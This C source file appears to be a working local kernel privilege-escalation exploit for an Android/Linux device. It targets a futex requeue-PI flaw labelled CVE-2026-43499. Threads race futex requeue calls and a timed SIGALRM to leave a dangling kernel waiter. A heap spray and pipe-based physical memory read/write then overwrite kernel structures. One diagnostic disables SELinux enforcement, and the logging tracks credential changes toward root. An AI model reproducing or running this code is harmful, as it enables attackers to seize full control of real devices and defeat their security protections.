#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

/*
 * CVE-2026-43499 requires the requeue-PI waiter to exit via a SIGNAL (EINTR),
 * NOT a clean timeout. The clean timeout path (rt_mutex_cleanup_proxy_lock ->
 * remove_waiter, str xzr,[task,#0x898]) NULLs task->pi_blocked_on, so the
 * consumer's later sched_setattr walk sees waiter==NULL and returns before the
 * chain (proven on-device: SCRATCH-DIAG diffs=0). Interrupting the blocked
 * waiter with SIGALRM and bumping its priority from inside the handler makes the
 * futex return EINTR while leaving pi_blocked_on set -> a dangling waiter the
 * pselect reclaim + consumer walk then drive. (Mechanism the oppo base dropped;
 * HANDOFF §2A documents it as the only reliable dangling-waiter generator.)
 */
volatile sig_atomic_t sigalrm_fired;
volatile int sigalrm_setprio_ret;
volatile int sigalrm_setprio_errno;
static void waiter_sigalrm_handler(int sig) {
  (void)sig;
  sigalrm_fired = 1;
  errno = 0;
  sigalrm_setprio_ret = setpriority(PRIO_PROCESS, 0, 5);
  sigalrm_setprio_errno = errno;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  /* Install the SIGALRM handler with SA_RESTART CLEARED so the requeue-PI futex
   * returns EINTR (not auto-restart) when the driver signals us mid-block. */
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = waiter_sigalrm_handler;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0;
  sigaction(SIGALRM, &sa, NULL);
  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                       &f_pi_target, 0);
  int werrno = errno;
  /* Keep the handler installed (harmless setpriority) rather than restoring
   * SIG_DFL, so a slightly-late pthread_kill can't terminate the process. */
  /* Durable (fsync'd) checkpoint: survives a kernel-panic reboot, unlike
   * pr_info. errno=4 EINTR => SIGALRM interrupted (dangling waiter wanted);
   * errno=110 clean timeout => pi_blocked_on cleared (no dangling waiter). */
  pr_success("ckpt: waiter WAIT_REQUEUE_PI ret=%ld errno=%d tid=%d "
             "sigalrm=%d setprio=%d/%d\n",
             wret, werrno, atomic_load(&waiter_tid), (int)sigalrm_fired,
             sigalrm_setprio_ret, sigalrm_setprio_errno);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  pr_success("ckpt: waiter route_done set\n");

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  int heap_spray_done = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);

    /*
     * Heap spray exploitation:
     * After GhostLock trigger, use pipe physrw to:
     * 1. Read mm->owner to get task_struct
     * 2. Write fake waiter to sprayed heap address
     * 3. Change task->pi_blocked_on to point to spray address
     */
    if (!heap_spray_done && page_base && pipebuf_page_base) {
      pr_info("consumer: attempting heap spray exploitation\n");
      int skip_pi = env_flag("HEAP_SPRAY_SKIP_PI", 0);

      /* Get the pipe fd for physical read/write */
      int pipefd[2] = {-1, -1};
      if (pipe(pipefd) == 0) {
        /* Set up pipe physical read/write */
        if (install_pipe_physrw(pipefd[0])) {
          pr_success("consumer: pipe physrw ready\n");

          /* Run heap spray exploitation */
          int result = run_heap_spray_exploit(
              pipefd[0],         /* fd for pipe physrw */
              page_base,         /* leaked mm_struct */
              page_base);        /* spray address (reclaimed page) */

          if (result) {
            pr_success("consumer: heap spray exploitation succeeded\n");
            atomic_fetch_add(&consumer_success, 1);
          } else {
            pr_warning("consumer: heap spray exploitation failed\n");
          }
        } else {
          pr_warning("consumer: pipe physrw setup failed\n");
        }

        close(pipefd[0]);
        close(pipefd[1]);
      }

      heap_spray_done = 1;
      if (skip_pi) {
        pr_info("consumer: heap spray done, skipping PI trigger\n");
        atomic_store(&punch_consume_go, 0);
        break;
      }
    }

    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        int consumer_nice = env_int_range(
            "PSELECT_CONSUMER_NICE_VALUE", PSELECT_CONSUMER_NICE, -20, 19);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else {
          pr_info("consumer sched_setattr seq=%d ret=%ld errno=%d tid=%d "
                  "fake_lock=%016llx fake_w0=%016llx fake_fops=%016llx\n",
                  seq, sched_ret, sched_errno, tid, fake_lock, fake_w0,
                  fake_fops);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  /* Durable checkpoints: this whole function had NO logging, so a stop
   * between `heap_spray: page_base` and do_pselect's first line was
   * invisible. Each pr_success fsyncs, surviving a panic/reboot. */
  pr_success("ckpt: route enter\n");

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  pr_success("ckpt: route threads spawned\n");

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }
  pr_success("ckpt: route ready waiter_waiting=%d owner_started=%d\n",
             atomic_load(&waiter_waiting), atomic_load(&owner_started));

  usleep(100000);
  errno = 0;
  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                     &f_pi_target, 0);
  /* The CMP_REQUEUE_PI IS the CVE-2026-43499 trigger. If it Oopses the
   * kernel, this line (fsync'd) is the last durable record. */
  pr_success("ckpt: route CMP_REQUEUE_PI ret=%ld errno=%d\n", rq, errno);

  /* Signal the requeued waiter ~50ms in so it exits WAIT_REQUEUE_PI via EINTR
   * (handler bumps priority) instead of the clean timeout that NULLs
   * pi_blocked_on. This is what actually creates the dangling waiter. */
  usleep(env_int_range("SIGALRM_DELAY_USEC", 50000, 0, 5000000));
  int pkret = pthread_kill(waiter, SIGALRM);
  pr_success("ckpt: route pthread_kill(waiter,SIGALRM) ret=%d\n", pkret);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  pr_success("ckpt: route done\n");
}

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  (void)argc;
  (void)argv;
  log_startup_context();
  init_ashmem_path();

  /* Skip slide leak, use direct-map calculation */
  kaslr_base = P0_PAGE_OFFSET + P0_KERNEL_PHYS_LOAD;
  kaslr_slide = 0;
  kaslr_done = 1;
  pr_success("direct-map base=%016llx slide=%016llx\n", kaslr_base, kaslr_slide);

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  if (page_base) {
    pr_success("heap_spray: page_base=%016llx (leaked mm_struct)\n",
               (unsigned long long)page_base);
  }

  /*
   * Pre-stage heap spray data BEFORE GhostLock trigger.
   * The pipe physrw setup happens inside run_main_route_threads(),
   * but we need to prepare the fake waiter data early.
   *
   * The actual pi_blocked_on redirect will happen in consumer_thread
   * after the GhostLock trigger creates the dangling pointer.
   */
  /* Bulletproof write-proof (ENFORCING_WRITE_DIAG=1): the rb-erase store is aimed
   * at &selinux_state.enforcing instead of &ashmem_misc.fops (util.c). Read
   * getenforce before/after: a 1->0 flip proves the chain-walk dequeue store
   * actually executes on-device, isolating "walk doesn't write" from "wrong fops
   * target/method". Uses the /sys/fs/selinux/enforce channel (always reliable). */
  int enforce_diag = env_flag("ENFORCING_WRITE_DIAG", 0);
  char enf_before[32] = "?";
  if (enforce_diag) {
    read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
    pr_success("ckpt: ENFORCING_WRITE_DIAG target=%016llx enforce_before=%s\n",
               (unsigned long long)data_addr(SELINUX_ENFORCING), enf_before);
  }

  run_main_route_threads();

  if (enforce_diag) {
    char enf_after[32] = "?";
    read_first_line("/sys/fs/selinux/enforce", enf_after, sizeof(enf_after));
    pr_success("ckpt: ENFORCING_WRITE_DIAG enforce_before=%s enforce_after=%s "
               "walk_wrote=%d\n",
               enf_before, enf_after,
               (int)(enf_after[0] == '0' && enf_before[0] != '0'));
  }

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016llx slide=%016llx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}

